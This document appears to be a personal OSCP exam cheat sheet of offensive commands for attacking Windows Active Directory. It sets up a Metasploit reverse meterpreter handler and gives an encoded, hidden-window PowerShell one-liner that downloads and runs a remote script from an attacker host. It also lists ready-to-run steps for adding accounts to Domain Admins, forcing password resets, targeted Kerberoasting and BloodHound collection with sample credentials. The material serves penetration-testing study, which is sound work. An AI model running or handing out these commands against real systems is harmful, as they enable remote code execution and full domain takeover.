cheat sheet oscp
Bloodhound
bloodhound-python -d domain.local -u username -p password -v --zip -c All -dc domain.local -ns 192.168.1.1
sharphound

Check group members
net rpc group members "groupname" -U "domain.local/pooja.ritu%qazwsx" -S 192.168.1.1



commands
----
Host IP: 192.168.xx.xx
target IP: 192.168.xx.xx
----

Launch msfconsole
------------------

service postgresql start
sudo msfdb start
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST tun0
set LPORT 4444
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
exploit -jz

Reverse Shell
-------------
$Command = "(New-Object System.Net.WebClient).DownloadString('http://192.168.xx.xx/rev.ps1') | IEX"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$EncodedCommand = [Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell -$ta -Nop -Window Hidden -EncodedCommand $EncodedCommand

base64

DACL Genricall
--------------

net rpc user -U ignite.local/komal%'Password@1' -S 192.168.1.8
net rpc group members "Domain Admins" -U ignite.local/komal%'Password@1' -S 192.168.1.8
bloodhound-python -u komal -p Password@1 -ns 192.168.1.8 -d ignite.local -c All

Account Manipulation DACL(Discretionary Access Control Lists )
--------------------
net rpc group addmem "Domain Admins" "komal" -U ignite.local/komal%'Password@1' -S 192.168.1.8
bloodyAD --host "192.168.1.8" -d "ignite.local" -u "komal" -p "Password@1" add groupMember "Domain Admins" "komal"
net group "domain admins" komal /add /domain
#create two user account 
net user vipin Password@1 /add /domain
net user nishant Password@1 /add /domain
#Multiple Method for Exploitation
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
./targetedKerberoast.py --dc-ip '192.168.1.8' -v -d 'ignite.local' -u 'nishant' -p 'Password@1'
#1.2 Windows PowerShell Script-Powerview
#Make sur that the target account has no SPN and then Set the SPN to obtain the KerbTGS hash
Get-DomainUser 'vipin' | Select serviceprincipalname
Set-DomainObject -Identity 'vipin' -Set @{serviceprincipalname='nonexistent/hackingarticles'}
$User = Get-DomainUser 'vipin'
$User | Get-DomainSPNTicket | f1

![image](https://github.com/user-attachments/assets/cfff6843-6551-426b-8656-0d1b0da202ee)

#T1110.001 – Change Password
#2.1 Linux Net RPC – Samba
net rpc password vipin 'Password@987' -U ignite.local/nishant%'Password@1' -S 192.168.1.8
bloodyAD --host "192.168.1.8" -d "ignite.local" -u "nishant" -p "Password@1" set password "vipin" "Password@9876"
#2.3 Linux Net RPC –Rpcclient
rpcclient -U ignite.local/nishant 192.168.1.8
setuserinfo vipin 23 Ignite@987
#2.4 Windows Net Utility
net user Vipin Password@1234 /domain
#2.5 Windows PowerShell -Powerview
$SecPassword = ConvertTo-SecureString 'Password@987' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ignite.local\vipin', $SecPassword)
#2.6 Windows PowerShell
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'vipin' -AccountPassword $NewPassword


Abusing AD-DACL: ForceChangePassword
--------------------------------------

#This permission provides right to change the password of a user account without knowing their current password.
#This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change-Password over the #target user.
#Method for Exploitation – Change Password
#It can be achieved from UNIX-like system with net, a tool for the administration of samba and cifs/smb clients.
#net rpc password aarti 'Password@987' -U ignite.local/raj%'Password@1' -S 192.168.1.8
#Linux Net RPC – Rpcclient
rpcclient -U ignite.local/raj 192.168.1.8
setuserinfo aarti 23 Password@987
bloodyAD --host "192.168.1.8" -d "ignite.local" -u "raj" -p "Password@1" set password "aarti" "Password@987"
#Windows PowerShell – Powerview
powershell -ep bypass
Import-Module .\PowerView.ps1
$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
Set-DomainUserPassword -Identity 'aarti' -AccountPassword $NewPassword

addself acl
-----------
The tester can abuse this permission by adding Anuradha User into Domain Admin group and list the domain admin members to ensure that Anuradha Users becomes Domain Admin.
net rpc group addmem "Domain Admins" anuradha -U ignite.local/anuradha%'Password@1' -S 192.168.1.7
bloodyAD --host "192.168.1.7" -d "ignite.local" -u "anuradha" -p "Password@1" add groupMember "Domain Admins" "anuradha"

The attacker can add a user/group/computer to a group. This can be achieved with with the Active Directory PowerShell module, or with Add-DomainGroupMember (PowerView module)
powershell -ep bypass
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'Password@1' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ignite.local\anuradha', $SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'anuradha' -Credential $Cred


Active Directory

TOOLS:

adPEAS-Light.ps1 >>      https://github.com/61106960/adPEAS/blob/main/adPEAS-Light.ps1
PowerUp.ps1 >>>          https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
PowerView.ps1>>          https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
